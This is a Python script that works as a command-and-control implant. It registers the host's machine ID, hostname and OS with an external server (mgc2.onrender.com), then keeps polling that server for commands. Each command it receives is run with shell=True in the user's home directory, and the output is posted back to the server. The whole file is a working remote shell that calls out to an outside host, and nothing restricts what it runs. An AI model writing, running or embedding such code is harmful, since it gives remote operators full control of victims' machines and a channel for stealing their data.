import subprocess
import requests, time, os, socket, platform

hostname = socket.gethostname()

# Fixed to run safely without shell=True, and stripping trailing newlines
if platform.system() == "Linux":
    try:
        with open("/etc/machine-id", "r") as f:
            machine_id = f.read().strip()
    except Exception:
        machine_id = hostname
        # Fallback if file missing
else:
    # On Windows, we can combine the node name (MAC address tracker) or just use hostname
    machine_id = f"{platform.node()}_win_id"

theos = platform.system()

checkinurl = "https://mgc2.onrender.com/checkin"

# Added .strip() to ensure clean strings without trailing line breaks
data2checkin = {
    "machine_id": str(machine_id),
    "hostname": str(hostname),
    "os": theos,
}

response1 = requests.post(checkinurl, json=data2checkin)


# Define the base configuration
SERVER_URL = "https://mgc2.onrender.com"
MAILBOX_ID = str(machine_id)

while True:
    time.sleep(0.2)
    get_url = f"{SERVER_URL}/mailbox/{MAILBOX_ID}"
    response = requests.get(get_url)

    # --- FIX: Only process if the server successfully found the mailbox ---
    if response.status_code == 200:
        command = response.text.strip()

        # 2. Check if there is a command to run
        if command != "NONE":
            print(f"Executing command: {command}")

            try:
                # Run the command locally on the machine and capture the output
                result = subprocess.run(
                    command,
                    shell=True,  # Added shell=True so Windows/Linux commands work properly
                    capture_output=True,
                    text=True,
                    timeout=10,
                    cwd = os.path.expanduser("~")
                )

                # Combine standard output and standard error so you see everything
                execution_output = result.stdout + result.stderr
                if not execution_output:
                    execution_output = "(Command executed with no output)"

            except Exception as e:
                execution_output = f"Execution failed: {str(e)}"

            # 3. Post the output back to the server
            post_url = f"{SERVER_URL}/mailbox/{MAILBOX_ID}/output"
            payload = {
                "output": execution_output
            }

            post_response = requests.post(post_url, json=payload)

            if post_response.status_code == 200:
                print("Output successfully sent back to the server.")
            else:
                print(f"Failed to send output. Server status: {post_response.status_code}")
    else:
        # If the server returns a 404, it means no command has been queued up yet from the dashboard
        print(f"Waiting for command... (Server status: {response.status_code})")
        time.sleep(2) # Sleep a bit longer if nothing is ready
